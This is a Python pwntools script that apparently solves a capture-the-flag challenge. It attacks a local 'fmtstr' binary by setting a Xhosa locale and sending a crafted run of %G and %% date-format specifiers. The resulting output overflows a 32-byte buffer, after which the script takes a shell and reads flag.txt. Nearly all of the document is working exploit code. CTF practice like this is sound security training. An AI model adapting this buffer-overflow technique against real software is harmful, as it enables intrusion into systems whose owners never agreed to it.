# from ctflib.pwn import *
from pwn import *

e = ELF("distribution/fmtstr")
context.binary = e


def setup():
    p = remote("localhost",31234)
    return p


def print_time(p, enter_format_specifier: bytes):
    assert all(
        x == ord("%") for i, x in enumerate(enter_format_specifier) if i % 2 == 0
    ), "Invalid format string"
    p.sendafter(b">", b"1\n")
    p.sendlineafter(b"Enter format specifier:", enter_format_specifier)
    p.recvuntil("Formatted: ")
    return p.recvline(keepends=False)


def set_locale(p, enter_new_locale: bytes):
    p.sendafter(b">", b"2\n")
    p.sendlineafter(b"Enter new locale:", enter_new_locale)


if __name__ == "__main__":
    p = setup()

    buf_size = 0x20
    # %G will be the year (4 characters)
    locale = b"xh_ZA.utf8"
    format = b"%b"
    out = b"Tsh"

    size = buf_size - len(out) + 2

    years = size // 4
    set_locale(p, locale)
    pl = b"%G" * years + b"%%" * (size - years * 4) + format
    print(pl)
    print_time(p, pl)
    p.sendline("3")
    p.recvuntil("!")
    p.recvuntil("!")
    p.sendline("cat flag.txt")

    p.interactive()
